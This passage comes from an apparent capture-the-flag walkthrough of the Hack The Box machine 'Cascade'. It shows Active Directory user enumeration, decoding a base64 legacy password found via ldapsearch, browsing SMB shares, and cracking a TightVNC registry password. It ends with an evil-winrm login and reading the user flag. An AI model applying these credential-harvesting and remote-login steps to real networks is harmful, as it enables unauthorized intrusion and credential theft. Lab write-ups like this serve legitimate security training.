Group </span><span class="sh">'</span><span class="n">AD</span> <span class="n">Recycle</span> <span class="n">Bin</span><span class="sh">'</span><span class="s"> (RID: 1119) has member: CASCADE</span><span class="se">\a</span><span class="s">rksvc
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE</span><span class="se">\a</span><span class="s">dministrator
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\krbtgt
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE</span><span class="se">\a</span><span class="s">rksvc
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\s.smith
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE</span><span class="se">\r</span><span class="s">.thompson
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\util
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\j.wakefield
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\s.hickson
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\j.goodhand
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE</span><span class="se">\a</span><span class="s">.turnbull
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\e.crowe
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE</span><span class="se">\b</span><span class="s">.hanson
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\d.burman
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\BackupSvc
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\j.allen
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 513) has member: CASCADE\i.croft
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group </span><span class="sh">'</span><span class="n">Domain</span> <span class="n">Guests</span><span class="sh">'</span><span class="s"> (RID: 514) has member: CASCADE\CascGuest
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group </span><span class="sh">'</span><span class="n">Group</span> <span class="n">Policy</span> <span class="n">Creator</span> <span class="n">Owners</span><span class="sh">'</span><span class="s"> (RID: 520) has member: CASCADE</span><span class="se">\a</span><span class="s">dministrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
</span></code></pre></div></div>

<h2 id="using-ldap-search">Using Ldap Search—</h2>

<h2 id="intresting-findings-from-ldapsearch">Intresting findings from <code class="language-plaintext highlighter-rouge">ldapsearch</code></h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dn: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>uSNChanged: 295010
name: Ryan Thompson
objectGUID:: <span class="nv">LfpD6qngUkupEy9bFXBBjA</span><span class="o">==</span>
userAccountControl: 66048
badPwdCount: 8
codePage: 0
countryCode: 0
badPasswordTime: 132299219591809760
lastLogoff: 0
lastLogon: 132299203623153712
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: <span class="nv">AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA</span><span class="o">==</span>
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
</code></pre></div></div>
<h3 id="this-seems-more-intresting">This seems more intresting..</h3>

<p><code class="language-plaintext highlighter-rouge">cascadeLegacyPwd: clk0bjVldmE=</code></p>

<h3 id="decoding-with-the-base64">Decoding with the base64</h3>

<p><code class="language-plaintext highlighter-rouge">echo "clk0bjVldmE=" | base64 -d</code></p>

<p><code class="language-plaintext highlighter-rouge">rY4n5eva</code></p>

<h2 id="using-smbclient-for-further-more-enumeration">Using <code class="language-plaintext highlighter-rouge">smbclient</code> for further more enumeration!</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">smbclient</span> <span class="o">-</span><span class="no">L</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="no">U</span> <span class="n">r</span><span class="p">.</span><span class="nf">thompson</span>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">r</span><span class="p">.</span><span class="nf">thompson</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 

        </span><span class="no">Sharename</span>       <span class="no">Type</span>      <span class="no">Comment</span>
        <span class="o">---------</span>       <span class="o">----</span>      <span class="o">-------</span>
        <span class="no">ADMIN</span><span class="err">$</span>          <span class="no">Disk</span>      <span class="no">Remote</span> <span class="no">Admin</span>
        <span class="no">Audit</span><span class="err">$</span>          <span class="no">Disk</span>      
        <span class="no">C</span><span class="err">$</span>              <span class="no">Disk</span>      <span class="no">Default</span> <span class="n">share</span>
        <span class="no">Data</span>            <span class="no">Disk</span>      
        <span class="no">IPC</span><span class="err">$</span>            <span class="no">IPC</span>       <span class="no">Remote</span> <span class="no">IPC</span>
        <span class="no">NETLOGON</span>        <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
        <span class="nb">print</span><span class="err">$</span>          <span class="no">Disk</span>      <span class="no">Printer</span> <span class="no">Drivers</span>
        <span class="no">SYSVOL</span>          <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
<span class="no">SMB1</span> <span class="n">disabled</span> <span class="o">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span>
</code></pre></div></div>
<h3 id="some-more-intresting-findings">Some more intresting findings!</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">smbclient</span> <span class="sr">//</span><span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span><span class="no">Data</span> <span class="o">-</span><span class="no">U</span> <span class="n">r</span><span class="p">.</span><span class="nf">thompson</span>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">r</span><span class="p">.</span><span class="nf">thompson</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 
</span><span class="no">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="p">.</span>
<span class="nf">smb</span><span class="p">:</span> <span class="p">\</span><span class="o">&gt;</span> <span class="n">ls</span>
  <span class="o">.</span>                                   <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">26</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">34</span> <span class="mi">2020</span>
  <span class="o">..</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">26</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">34</span> <span class="mi">2020</span>
  <span class="no">Contractors</span>                         <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">12</span> <span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">11</span> <span class="mi">2020</span>
  <span class="no">Finance</span>                             <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">12</span> <span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mo">06</span> <span class="mi">2020</span>
  <span class="no">IT</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="no">Production</span>                          <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">12</span> <span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">18</span> <span class="mi">2020</span>
  <span class="no">Temps</span>                               <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">12</span> <span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">15</span> <span class="mi">2020</span>

                <span class="mi">13106687</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">7806882</span> <span class="n">blocks</span> <span class="n">available</span>
<span class="ss">smb: </span><span class="p">\</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="no">It</span>
<span class="ss">smb: </span><span class="p">\</span><span class="no">It</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">ls</span>
  <span class="o">.</span>                                   <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="o">..</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="no">Email</span> <span class="no">Archives</span>                      <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">30</span> <span class="mi">2020</span>
  <span class="no">LogonAudit</span>                          <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">40</span> <span class="mi">2020</span>
  <span class="no">Logs</span>                                <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mo">04</span> <span class="mi">2020</span>
  <span class="no">Temp</span>                                <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">59</span> <span class="mi">2020</span>

                <span class="mi">13106687</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">7806882</span> <span class="n">blocks</span> <span class="n">available</span>

</code></pre></div></div>

<p>After moving into the <code class="language-plaintext highlighter-rouge">dir</code> <code class="language-plaintext highlighter-rouge">Email Archives</code>……….</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">smb: </span><span class="p">\</span><span class="no">IT</span><span class="p">\</span><span class="no">Email</span> <span class="no">Archives</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">ls</span>
  <span class="o">.</span>                                   <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="o">..</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="no">Meeting_Notes_June_2018</span><span class="p">.</span><span class="nf">html</span>        <span class="no">A</span>     <span class="mi">2522</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>

		<span class="mi">13106687</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">7793283</span> <span class="n">blocks</span> <span class="n">available</span>


<span class="ss">smb: </span><span class="p">\</span><span class="no">IT</span><span class="p">\</span><span class="no">Email</span> <span class="no">Archives</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="no">Meeting_Notes_June_2018</span><span class="p">.</span><span class="nf">html</span>                                                                                                                                                                                 
<span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="no">IT</span><span class="p">\</span><span class="no">Email</span> <span class="no">Archives</span><span class="p">\</span><span class="no">Meeting_Notes_June_2018</span><span class="p">.</span><span class="nf">html</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">2522</span> <span class="n">as</span> <span class="no">Meeting_Notes_June_2018</span><span class="p">.</span><span class="nf">html</span> <span class="p">(</span><span class="mf">3.3</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">3.3</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> 
</code></pre></div></div>
<hr />

<p><code class="language-plaintext highlighter-rouge">cat Meeting_Notes_June_2018.html </code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p&gt;-- New production network will be going live on                                                                                                                                                                                         
Wednesday so keep an eye out <span class="k">for </span>any issues. &lt;/p&gt;                                                                                                                                                                                          
                                                                                                                                                                                                                                           
&lt;p&gt;-- We will be using a temporary account to                                                                                                                                                                                              
perform all tasks related to the network migration and this account will be deleted at the end of                                                                                                                                          
2018 once the migration is complete. This will allow us to identify actions                                                                                                                                                                
related to the migration <span class="k">in </span>security logs etc. Username is TempAdmin <span class="o">(</span>password is the same as the normal admin account password<span class="o">)</span><span class="nb">.</span> &lt;/p&gt;                                                                                                     
                                                                                                                                                                                                                                           
&lt;p&gt;-- The winner of the �Best GPO� competition will be                                                                                                                                                                                     
announced on Friday so get your submissions <span class="k">in </span>soon.&lt;/p&gt;                 
</code></pre></div></div>

<p>So from here I moved into the <code class="language-plaintext highlighter-rouge">Temp</code> folder and found a user <code class="language-plaintext highlighter-rouge">S.Smith</code>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">smb: </span><span class="p">\</span><span class="no">IT</span><span class="p">\</span><span class="no">Temp</span><span class="p">\</span><span class="n">s</span><span class="p">.</span><span class="nf">smith</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">ls</span>
  <span class="o">.</span>                                   <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Wed</span> <span class="no">Jan</span> <span class="mi">29</span> <span class="mo">05</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="mi">2020</span>
  <span class="o">..</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Wed</span> <span class="no">Jan</span> <span class="mi">29</span> <span class="mo">05</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="mi">2020</span>
  <span class="no">VNC</span> <span class="no">Install</span><span class="p">.</span><span class="nf">reg</span>                     <span class="no">A</span>     <span class="mi">2680</span>  <span class="no">Wed</span> <span class="no">Jan</span> <span class="mi">29</span> <span class="mo">04</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">44</span> <span class="mi">2020</span>

                <span class="mi">13106687</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">7793278</span> <span class="n">blocks</span> <span class="n">available</span>
</code></pre></div></div>

<p>Here there is a registery found <code class="language-plaintext highlighter-rouge">VNC Install.reg</code>. let’s see what’s inside that.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span> <span class="n">VNC</span> <span class="n">Install</span><span class="p">.</span><span class="n">reg</span> 
<span class="err">��</span><span class="n">Windows</span> <span class="n">Registry</span> <span class="n">Editor</span> <span class="n">Version</span> <span class="mf">5.00</span>

<span class="p">[</span><span class="n">HKEY_LOCAL_MACHINE</span>\<span class="n">SOFTWARE</span>\<span class="n">TightVNC</span><span class="p">]</span>

<span class="p">[</span><span class="n">HKEY_LOCAL_MACHINE</span>\<span class="n">SOFTWARE</span>\<span class="n">TightVNC</span>\<span class="n">Server</span><span class="p">]</span>
<span class="sh">"</span><span class="s">ExtraPorts</span><span class="sh">"</span><span class="o">=</span><span class="sh">""</span>
<span class="sh">"</span><span class="s">QueryTimeout</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">0000001</span><span class="n">e</span>
<span class="sh">"</span><span class="s">QueryAcceptOnTimeout</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">LocalInputPriorityTimeout</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000003</span>
<span class="sh">"</span><span class="s">LocalInputPriority</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">BlockRemoteInput</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">BlockLocalInput</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">IpAccessControl</span><span class="sh">"</span><span class="o">=</span><span class="sh">""</span>
<span class="sh">"</span><span class="s">RfbPort</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">0000170</span><span class="n">c</span>
<span class="sh">"</span><span class="s">HttpPort</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">000016</span><span class="n">a8</span>
<span class="sh">"</span><span class="s">DisconnectAction</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">AcceptRfbConnections</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">UseVncAuthentication</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">UseControlAuthentication</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">RepeatControlAuthentication</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">LoopbackOnly</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">AcceptHttpConnections</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">LogLevel</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">EnableFileTransfers</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">RemoveWallpaper</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">UseD3D</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">UseMirrorDriver</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">EnableUrlParams</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">Password</span><span class="sh">"</span><span class="o">=</span><span class="nb">hex</span><span class="p">:</span><span class="mi">6</span><span class="n">b</span><span class="p">,</span><span class="n">cf</span><span class="p">,</span><span class="mi">2</span><span class="n">a</span><span class="p">,</span><span class="mi">4</span><span class="n">b</span><span class="p">,</span><span class="mi">6</span><span class="n">e</span><span class="p">,</span><span class="mi">5</span><span class="n">a</span><span class="p">,</span><span class="n">ca</span><span class="p">,</span><span class="mi">0</span><span class="n">f</span>
<span class="sh">"</span><span class="s">AlwaysShared</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">NeverShared</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">DisconnectClients</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">PollingInterval</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mf">000003e8</span>
<span class="sh">"</span><span class="s">AllowLoopback</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">VideoRecognitionInterval</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000</span><span class="n">bb8</span>
<span class="sh">"</span><span class="s">GrabTransparentWindows</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">SaveLogToAllUsersPath</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">RunControlInterface</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="sh">"</span><span class="s">IdleTimeout</span><span class="sh">"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="sh">"</span><span class="s">VideoClasses</span><span class="sh">"</span><span class="o">=</span><span class="sh">""</span>
<span class="sh">"</span><span class="s">VideoRects</span><span class="sh">"</span><span class="o">=</span><span class="sh">""</span>
</code></pre></div></div>

<hr />

<p><code class="language-plaintext highlighter-rouge">"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></p>

<p>after cracking the <code class="language-plaintext highlighter-rouge">hex</code> we  get the password as <code class="language-plaintext highlighter-rouge">sT333ve2</code></p>

<hr />

<h2 id="login-as-ssmith">Login as S.Smith</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> cascade.htb <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; 
</code></pre></div></div>

<h2 id="getting-usertxt">Getting User.txt</h2>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">s</span><span class="p">.</span><span class="n">smith</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="p">..</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">s</span><span class="p">.</span><span class="n">smith</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">s</span><span class="p">.</span><span class="n">smith</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
<span class="mi">36</span><span class="n">e</span><span class="o">**************************</span><span class="mf">9e513</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">s</span><span class="p">.</span><span class="n">smith</span>\<span class="n">Desktop</span><span class="o">&gt;</span> 
</code></pre></div></div>

<h2 id="privilege-escalaition-part-1">Privilege Escalaition Part <code class="language-plaintext highlighter-rouge">1</code>:</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION
<span class="nt">----------------</span>

User Name       SID
<span class="o">===============</span> <span class="o">==============================================</span>
cascade<span class="se">\s</span>.smith S-1-5-21-3332504370-1206983947-1165150453-1107


GROUP INFORMATION
<span class="nt">-----------------</span>

Group Name                                  Type             SID                                            Attributes
<span class="o">===========================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">===============================================================</span>
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE<span class="se">\D</span>ata Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\A</span>udit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\I</span>T                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\R</span>emote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="se">\N</span>TLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
